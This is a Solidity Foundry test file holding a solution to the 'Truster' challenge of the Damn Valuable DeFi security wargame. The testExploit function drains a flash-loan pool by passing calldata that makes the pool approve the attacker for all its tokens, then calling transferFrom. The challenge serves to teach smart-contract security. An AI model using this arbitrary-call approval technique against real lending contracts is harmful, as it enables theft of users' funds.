// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../../src/DamnValuableToken.sol";
import "../../src/truster/TrusterLenderPool.sol";

contract TrusterTest is Test {
    uint256 internal constant TOKENS_IN_POOL = 1000000 ether;

    DamnValuableToken internal token;
    TrusterLenderPool internal pool;

    address internal deployer = address(1);
    address internal attacker = address(2);

    function setUp() public {
        startHoax(deployer);
        token = new DamnValuableToken();
        pool = new TrusterLenderPool(address(token));

        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), 0);

        vm.stopPrank();
    }

    function testExploit() public {
        /** YOUR EXPLOIT GOES HERE */
        startHoax(attacker);
        pool.flashLoan(
            0,
            attacker,
            address(token),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attacker,
                TOKENS_IN_POOL
            )
        );
        token.transferFrom(address(pool), attacker, TOKENS_IN_POOL);
        vm.stopPrank();

        /** SUCCESS CONDITION */
        assertEq(token.balanceOf(address(pool)), 0);
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
    }
}
